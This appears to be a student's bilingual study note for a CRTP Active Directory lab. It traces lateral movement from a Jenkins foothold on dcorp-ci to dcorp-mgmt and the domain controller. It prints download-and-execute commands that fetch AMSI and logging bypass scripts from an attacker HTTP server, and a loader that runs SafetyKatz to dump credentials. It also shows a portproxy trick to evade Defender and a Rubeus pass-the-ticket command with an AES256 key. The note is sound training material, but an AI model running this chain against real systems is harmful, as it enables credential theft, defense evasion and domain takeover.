
> [!INFO] What we do in this lab
 >1. Identify a machine with a Domain Admin session.
> 2. Investigate the escalation path from `dcorp-ci` to `dcorp-mgmt` and `dcorp-dc`.
 >3. Investigate the separate `dcorp-adminsrv` path: AppLocker rule gaps and GPO permissions.
 
 >[!IMPORTANT]
 >SEE AT THE END. THIS PATH FROM `dcorp-ci` to `dcorp-mgmt` IS EASIER BECAUSE THE SESSION GOT WITH JENKINS IS FOR A USER THAT HAS THE ACCESS TO `dcorp-mgmt`
 
## 1. Prepare the PowerShell environment

The lab begins with InviShell and PowerView.
```powershell
. C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
```
# 2.  Identify a machine in the target domain where a Domain Admin session in available.

## Discover privileged user sessions

> [!warning] HINTS
> We use session enumeration to find promising hosts, not to prove access. 
> 
> In BloodHound or session-hunting results, we should look for a path that connects a session-bearing computer to an identity or host we already control, then validate each edge.


Load Invoke-SessionHunter:
```powershell
. C:\AD\Tools\Invoke-SessionHunter.ps1
```

Run session discovery against the supplied host list:
```powershell
Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | Select-Object Hostname, UserSession, Access
```
-  ![[Pasted image 20261120101638.png|566]]
	-  `-NoPortScan` | Skips the preliminary port scan. |
	- `-RawResults` | Returns objects suitable for subsequent PowerShell processing. |
	- `-Targets` | Reads the list of target hosts from a file. |

**Alternative with PowerView:**
```powershell
Find-DomainUserLocation -Verbose
```
- You need admin privilege on the current machine to run it.

> [!NOTE] Spiegazione in italiano
> Cerchiamo i computer sui quali risultano sessioni di utenti privilegiati. È utile perché un amministratore di dominio può aver effettuato l'accesso a un server diverso dal Domain Controller. Tuttavia, sapere che la sessione esiste non significa poter amministrare quel server o recuperare credenziali: sono verifiche distinte.
  

## 3. Existing foothold on `dcorp-ci`
We already have a shell on `dcorp-ci` through Jenkins.
- ![[Pasted image 20261120102837.png|597]]

The lab uses an HTTP file server to make scripts available to the intermediate host. The following example **downloads text without executing it**: 

> [!NOTE] Spiegazione in italiano
> `dcorp-ci` è il punto d'appoggio ottenuto tramite Jenkins. 
> Da qui possiamo verificare se l'identità disponibile possiede accessi anche ad altri computer del dominio.

### 3.1 Set up the HFS HTTP server
On the lab workstation, start **HFS (HTTP File Server)** and add the following files to its shared directory:
- `sbloggingbypass.txt` — a lab script intended to interfere with PowerShell Script Block Logging.
- `Amsi-Byp.txt` — a lab script intended to interfere with AMSI inspection.
- `PowerView.ps1` — the Active Directory enumeration toolkit.

Make sure the files are exposed through the HFS server at `http://172.16.100.55/`. HFS is the **file host**, while `dcorp-ci` is the **client** that retrieves files over HTTP. The URL and address are lab-specific.
- ![[Pasted image 20261120141751.png|404]]

  

> [!NOTE] Perché usiamo HFS?
> Abbiamo già una shell su `dcorp-ci` tramite Jenkins, ma gli script si trovano sulla nostra macchina. 
> HFS li pubblica tramite HTTP, così la macchina remota può recuperarli senza una condivisione SMB. 

On the `dcorp-ci` we can download and directly execute them:

```powershell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.55/sbloggingbypass.txt')

iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.55/Amsi-Byp.txt')

iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.55/PowerView.ps1')
```
- This command **retrieves the script as text**., `iex` (`Invoke-Expression`) evaluates the downloaded text as PowerShell code in the current session. 


> [!NOTE] Cosa succede su dcorp-ci?
> Quando `dcorp-ci` contatta `172.16.100.55`, HFS risponde con il contenuto del file richiesto. 
> `DownloadString()` non salva automaticamente il file sul disco: restituisce il contenuto in memoria come stringa.
>  `iex` interpreta quella stringa come comandi PowerShell. 
>  I due script relativi ad AMSI e Script Block Logging servono a interferire con windows defender.


### 3.3 Continue with domain enumeration
After the PowerView functions are available in the session in `dcorp-ci`, continue with:
```powershell
Find-DomainUserLocation
```
- This help**s correlate privileged users and their sessions with computers in the domain**. The next section explains how to interpret the results.
	- ![[Pasted image 20261120110137.png|642]]
- We know that we can run `Find-DomainUserLocation` on a macine only if we have administartor privilege on it. And we can see in the results `ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local`
	- ![[Pasted image 20261120110330.png]]



> [!NOTE] Perché questo passaggio è importante?
> Ora possiamo interrogare il dominio dal contesto disponibile su `dcorp-ci`. 
> L'obiettivo è individuare un host interessante, come `dcorp-mgmt`, per poi **verificare separatamente** se abbiamo accesso remoto e quali privilegi possediamo. 


## 5.  Check if `dcorp-ci` has privileges on `dcorp-mgmt`

> [!warning] HINTS
> This is the decisive lateral-movement check in this path: 
> - the discovery tool suggests `dcorp-mgmt` while the WinRS result tells us whether the existing `dcorp-ci` context can execute a remote command. 
> 
> These facts should never be conflated.


We can check using this command:
- `winrs -r:dcorp-mgmt cmd /c "set computername && set username"`
	- ![[Pasted image 20261120110627.png]]
	- `winrs` | Windows Remote Shell client using WinRM. |
	- `-r:dcorp-mgmt` | Selects the remote host. |
	- `cmd /c` | Executes the command and exits. |

> [!NOTE] 
> Con `winrs` proviamo a eseguire un comando sul server remoto. 
> Stampiamo nome del computer e nome dell'utente per controllare dove siamo e con quale contesto viene eseguito il processo.

## 6. Stage the loader and examine credential exposure on `dcorp-mgmt`.

> [!warning] HINTS
> We should keep track of where each command runs: the student workstation, `dcorp-ci`, and `dcorp-mgmt` are three different execution contexts. 
> 
> Paths such as `C:\Users\Public` refer to the machine on which the command executes.


### 6.1 Place `Loader.exe` and `SafetyKatz.exe` on the HFS server
First, we require these files to be available on the HFS HTTP server at `172.16.100.55`:
- `Loader.exe` — the executable that we use to launch another program.
- `SafetyKatz.exe` — a Mimikatz-derived program to examine authentication material.  
- ![[Pasted image 20261120111630.png|178]]
  
### 6.2 Retrieve `Loader.exe` on `dcorp-ci`

We use this command to put the `loader.exe` on the `dcorp-ci` machine:
```powershell
iwr http://172.16.100.55/Loader.exe -OutFile C:\Users\Public\Loader.exe
```
- ![[Pasted image 20261120111837.png]]
- `iwr` is an alias for `Invoke-WebRequest`; 
- the URL identifies the HTTP resource and `-OutFile` specifies the destination file.
- `C:\Users\Public\` is the local destination **on `dcorp-ci`** when this command runs there.


> [!NOTE] Spiegazione in italiano
> Questo comando effettua una richiesta HTTP al server HFS e salva il file su `dcorp-ci`. L'opzione `-OutFile` è importante: senza di essa, `Invoke-WebRequest` non salverebbe automaticamente il contenuto in quel percorso.
  
### 6.3 Copy the loader from `dcorp-ci` to `dcorp-mgmt`
Now we have to pass the loader on `dcorp-mgmt`. We can do it from `dcorp-ci`:
```powershell
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```
- ![[Pasted image 20261120112014.png]]
  

> [!NOTE] Spiegazione in italiano
> Il file è inizialmente su `dcorp-ci`. 
> Con `xcopy` viene copiato nella cartella `Public` di `dcorp-mgmt` tramite la share amministrativa `C$`, che richiede autorizzazioni adeguate. 
> `echo F |` serve a rispondere automaticamente al prompt di `xcopy` quando chiede se la destinazione sia un file o una directory. 

### 6.4  Remote execution attempt and Defender block bypass
What we want to obtain is:
```powershell
winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://172.16.100.55/SafetyKatz.exe sekurlsa::evasive-keys exit"
```
- If we use it, Microsoft Defender will block us.
	- `winrs` launches a remote command through WinRM; 
	- `cmd /c` runs it and exits; the loader's `-path` parameter points to a remotely hosted executable. 
	- `sekurlsa::evasive-keys` is a SafetyKatz/Mimikatz command associated with obtaining authentication key material.

  

> [!NOTE] 
>Vogliamo che venga effettuato l'avvio remoto del loader su `dcorp-mgmt` tramite WinRS. 
>Il loader riceve un URL dal quale ottenere SafetyKatz e gli argomenti da passargli. 
>Il blocco osservato da Defender dimostra che i controlli di sicurezza intervengono su questa specifica esecuzione.

### 6.5 Portproxy configuration recorded in the lab
To bypass the block, we can set a tcp forwarding, in order to make Windows defender think we are just doing a request on `localhost`:
```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.55"
```
- ![[Pasted image 20261120112613.png]]
- `netsh interface portproxy add v4tov4` configures IPv4-to-IPv4 TCP forwarding. 
- `listenaddress=0.0.0.0` binds the listener to available IPv4 interfaces (not exclusively to loopback), 
- `listenport=8080` chooses the local listener port 
- `connectaddress`/`connectport` define the forwarding destination. 

```text
Connection to 127.0.0.1:8080 on dcorp-mgmt
                 │
                 └── TCP forwarding ──> 172.16.100.55:80 (HFS)
```


> [!NOTE] 
> Il comando crea un listener TCP sulla porta 8080 di `dcorp-mgmt` che inoltra le connessioni verso la porta 80 del server HFS. 
> `0.0.0.0` significa che l'ascolto non è limitato a `127.0.0.1`; il programma può comunque collegarsi tramite loopback. 
> L'idea è **setto un TCP forwarding in modo da trasformare le richieste a 127.0.0.1 : 8080 in richieste verso 172.16.100.55:80**, così windows defender non blocca l'esecuzione.


### 6.6 Original localhost-based invocation and evidence

Now we are ready to perform the remote execution of `Safetykatz.exe` on `dcorp-mgmt`

```powershell
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```
- ![[Pasted image 20261120113303.png]]
- ![[Pasted image 20261120123617.png]]
- It has a service run as `admin` "`0`", because service credentials are always stored in the registry keys

****
## 7. Interpret the `svcadmin` authentication material

> [!warning] HINTS
> We should identify the exact credential type before interpreting the output. 
> 
> A plaintext password, NTLM hash, Kerberos AES key, and ticket have different roles; an encryption-type label should not be silently reinterpreted.

Now we have seen we have a service run from `svcadmin` in admin mode.
We have from `SafetyKatz.exe` the password in clear text and also the `aes256_hash` credetials.
Also if it called ` des_cbc_md4`:

```text
dcorp\svcadmin
```
- ![[Pasted image 20261120123617.png|412]]
- ![[Pasted image 20261120124138.png|503]]
  

An AES256 key is 32 bytes, commonly represented by **64 hexadecimal characters**. `des_cbc_md4` and AES256 are **not** equivalent. A username such as `svcadmin` does not independently prove Domain Admin membership.

  

> [!NOTE] Spiegazione in italiano
> Qui dobbiamo distinguere password in chiaro, hash NTLM, chiavi Kerberos e ticket: sono oggetti diversi. 
> Una chiave AES256 ha 256 bit, quindi 64 caratteri esadecimali quando viene rappresentata in esadecimale.
La dicitura `des_cbc_md4` indica invece un tipo di cifratura legacy differente. Ma c'è qualche problema perchè in realtà è una hash `aes256`.




But now we will use the `des_cbc_md4` and not the clear text password:
- ![[Pasted image 20261120124138.png]]


Now we retrieved an `aes256` hash pass (called `des_cbc_md4` to make things more difficult). 

## 8. Use the `svcadmin` Kerberos key from the our student machine

We return to **our own workstation**, where `Loader.exe` and `Rubeus.exe`.
### 8.1 Understand the Kerberos ticket flow
A simplified Kerberos authentication process looks like this:

```text
Authentication to KDC (AS exchange) → Ticket Granting Ticket (TGT)
                                          ↓
                                Request service ticket (TGS)
                                          ↓
                                  Access remote service
```
- A **Ticket Granting Ticket (TGT)** is used to request service tickets. Rubeus provides functionality to interact with Kerberos authentication and ticket management. 
- In this exercise, the relevant feature is `asktgt`, which requests a TGT using the supplied authentication material.

  

> [!NOTE] Cos'è il TGT?
> Kerberos non invia semplicemente la password a ogni server. 
> Prima il client si autentica al **KDC**, normalmente sul Domain Controller, e ottiene un **TGT**. 
> Successivamente usa il TGT per richiedere ticket destinati ai servizi. 
> Per questo una chiave Kerberos valida, se esposta, è molto sensibile: può essere utilizzata per autenticarsi senza conoscere necessariamente la password in chiaro.
### 8.2 Original Rubeus

What we want to do now, is to request a ticket to kerberos using the `aes256` hash credentials of `svcadmin` in order to connect a shell to `dcorp-mgmt`.

In our student machine with `admin privileges`:
```powershell

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

```
- ![[Pasted image 20261120130505.png]]
	- `C:\AD\Tools\Loader.exe` | Runs the loader located on the lab workstation. |
	- `-path C:\AD\Tools\Rubeus.exe` | Specifies the Rubeus executable that the loader is intended to run. |
	- `-args asktgt` | Supplies Rubeus arguments and selects the TGT-request functionality. |
	- `/user:svcadmin` | Identifies the Kerberos account involved in the request. |
	- `/aes256:<key>` | Supplies a Kerberos AES256 long-term key; the lab command contains its original hexadecimal value. |
	- `/opsec` | Requests Rubeus's alternative, operational-security-oriented behavior; it is not a guarantee of stealth.  
	- `/createnetonly:C:\Windows\System32\cmd.exe` | Creates a process with a separate **network-only** logon context.  
	- `/show` | Requests display of ticket-related information produced by the operation.
	- `/ptt` | Requests submission of the obtained ticket into the relevant Windows logon session (*pass-the-ticket*). |

>[!IMPORTANT] This command can be executed only in a cmd opened as **administrator** in our student VM
>![[Pasted image 20261120160457.png]]




> [!NOTE] Cosa fa il comando?
 Il programma `Loader.exe` richiama `Rubeus.exe` con i parametri indicati. 
 `asktgt` riguarda la richiesta di un Ticket Granting Ticket per l'account `svcadmin`, mentre `/aes256` identifica la **chiave Kerberos AES256** utilizzata in quella richiesta: **non è un hash `des_cbc_md4`**. 
 La parte `/createnetonly` crea un nuovo processo `cmd.exe` con un contesto specifico per le autenticazioni verso la rete; `/ptt` riguarda l'associazione del ticket a una sessione di accesso. È importante non confondere questi meccanismi con un cambio dell'identità locale del processo.


### 8.3 Why does `whoami` still show `student555`?
We have a shell on `dcorp-mgmt` now but if we trigger:
```powershell
whoami
```
- It replies with `dcorp\student555` 
- ![[Pasted image 20261120161202.png]]

This is **not necessarily an error**. A network-only logon can keep the original **local** process token while using another authentication context for **outbound** connections.


That means we must distinguish three concepts:
1. **Local process identity** — what `whoami` reports on our workstation.
2. **Network authentication identity** — the identity used when accessing a remote service.
3. **Remote authorization** — the privileges that the target service grants after authentication.


> [!NOTE] Perché whoami non diventa svcadmin?
> `whoami` interroga il token dell'utente **locale** associato al processo. 
> Con un logon di tipo *network-only*, quel token può restare `dcorp\student555`; cambia invece il contesto delle credenziali usate quando il processo si autentica su un altro computer. 


## 9. Validate access to the Domain Controller (`dcorp-dc`)

> [!warning] HINTS
> Successful remote command execution shows that the target accepted an authentication and authorization context. 
> 
> It does not, on its own, prove membership in the Domain Admins group.

After obtaining the network authentication context described in the previous step, we can test remote command execution against the Domain Controller.
### 9.1 Test a remote command on `dcorp-dc`
We can test it with:
```powershell
winrs -r:dcorp-dc cmd /c set username
```
- ![[Pasted image 20261120130502.png]]
- `winrs` | Windows Remote Shell client, used for remote command execution through WinRM. |
- `-r:dcorp-dc` | Selects the Domain Controller as the remote endpoint. |
- `cmd /c` | Runs a command in the remote command interpreter and then exits. |
- `set username` | Prints the `USERNAME` environment variable in the remote command process. |
  

> [!NOTE]  Perché eseguiamo questa verifica?
> Con `winrs` proviamo una **vera operazione verso il Domain Controller**, per capire se l'autenticazione di rete è stata accettata. 
> 
> `-r:dcorp-dc` indica il computer remoto; 
> `cmd /c set username` esegue un comando e termina. 
> Se riceviamo una risposta, abbiamo dimostrato l'esecuzione remota con il contesto accettato dal servizio. Questo però non basta, da solo, per dichiarare formalmente che l'account appartiene al gruppo **Domain Admins**.

### 9.2 Open a remote command shell on `dcorp-dc`

Now we can try to popup a shell directly on the domain controller `dcorp-dc`. If `svcadmin` has privileges on the `domain controller` we can use:
```powershell
winrs -r:dcorp-dc cmd
```
- Then we check with `set`:
	- ![[Pasted image 20261120130753.png|675]]

Unlike the preceding command, this starts a remote `cmd` session rather than executing only one command and exiting. 

  

> [!NOTE] Cosa cambia rispetto al comando precedente?
> Prima lanciavamo un singolo comando (`set username`), quindi il processo remoto terminava. Qui chiediamo a WinRS di avviare direttamente `cmd` sul Domain Controller, ottenendo una shell remota se il servizio accetta l'operazione. 


### 9.3 Exam takeaways
- A **Kerberos AES256 key** is not a DES key, an NTLM hash, or a TGT.
- `asktgt` concerns obtaining a **TGT**, whereas `/ptt` concerns placing a ticket in a logon session.
- `/createnetonly` helps explain why **local identity** and **outbound authentication identity** may differ.
- Successful remote execution proves an access path, but **does not by itself establish** Domain Admin group membership.


> [!NOTE] Cosa ricordare per il CRTP?
> Devi saper spiegare la sequenza logica: **materiale di autenticazione → richiesta del TGT → contesto di autenticazione di rete → verifica sul servizio remoto**. 
> Non devi confondere il nome mostrato da `whoami` con l'identità usata per comunicare con un altro server. Quando documenti l'esame, registra sempre ciò che gli screenshot provano realmente e distingui l'accesso a un computer dai privilegi amministrativi sul dominio.


## 11. CRTP quick-reference

>[!IMPORTANT]
>Session discovery | Session presence ≠ administrative access. |
WinRS | Remote command execution ≠ Domain Admin membership. |
Administrative share | Requires suitable remote permissions. |
LSASS | Authentication material depends on logon type and protections. |
Kerberos AES key | Not the same as an NTLM hash or a TGT. |
TGT | Used to request service tickets. |
Network-only logon | Local identity can differ from outbound network credentials. |
AppLocker | Application-control rules can have gaps. |
GPO ACLs | Policy modification rights are an authorization boundary. |

  
![[Flusso del laboratorio CRTP_ dal foothold al Domain Controller.png|700]]


# Understanding the Attack Path: From `dcorp-ci` to `dcorp-mgmt`

## Understanding the attack path: From `dcorp-ci` to `dcorp-mgmt`
In this attack path, we already have a shell on `dcorp-ci` obtained through Jenkins.

Our objective is to leverage the security context available on `dcorp-ci` to gain remote access to `dcorp-mgmt`.

The attack follows these steps:
1. **Initial foothold:** We have a shell on `dcorp-ci` through Jenkins.
2. **Session enumeration:** We use `Find-DomainUserLocation` to identify machines where privileged domain users have active sessions. We discover `dcorp-mgmt`.
3. **Remote access validation:** We use `winrs` from `dcorp-ci` to check whether our current security context allows remote command execution on `dcorp-mgmt`.
4. **Access to dcorp-mgmt:** The successful WinRS execution confirms that we can execute commands remotely on the target.
5. **Credential exposure:** Once we have access to `dcorp-mgmt`, we investigate authentication material associated with privileged accounts, eventually identifying `svcadmin`.
6. **Further escalation:** The lab then explores Kerberos authentication using `svcadmin` to reach `dcorp-dc`.

  

### Key commands for discovery and access validation

```powershell
# Identify hosts with privileged sessions (discovery only)

Find-DomainUserLocation

# Check remote execution on dcorp-mgmt from the dcorp-ci context
winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```

  

> [!IMPORTANT] Key concept — Lateral Movement
> We are not using `Find-DomainUserLocation` to gain access directly. We use it to identify an interesting target.
> 
> The actual lateral movement from `dcorp-ci` to `dcorp-mgmt` happens through **WinRS**, using the security context available on `dcorp-ci`.
>


  

> [!NOTE] 
> In questo caso, a differenza del percorso tramite `dcorp-adminsrv`, **non recuperiamo prima le credenziali di `srvadmin`**.
> 
> Abbiamo già compromesso `dcorp-ci` attraverso Jenkins e vogliamo capire se possiamo sfruttare i privilegi dell'identità con cui stiamo eseguendo i comandi per accedere a un altro server.
>
> Utilizziamo `Find-DomainUserLocation` per individuare le macchine dove sono presenti sessioni privilegiate. Tra queste troviamo `dcorp-mgmt`.
> 
> Successivamente, tramite `winrs`, verifichiamo se il contesto di sicurezza disponibile su `dcorp-ci` ci permette di eseguire comandi su `dcorp-mgmt`.

  
## Attack flow — Quick reference


```text
Student workstation
        │
        ▼
    Jenkins foothold
        │
        ▼
      dcorp-ci (in this case can connect directly to dcorp-mgmt)
        │
        ├── Find-DomainUserLocation
        │         └── Finds interesting host: dcorp-mgmt
        │
        └── WinRS access check
                  └── Validates remote command execution
                           │
                           ▼
                        dcorp-mgmt
                           │
                           ▼
                Authentication material
                     (svcadmin)
                           │
                           ▼
                 Kerberos authentication
                           │
                           ▼
                        dcorp-dc
```

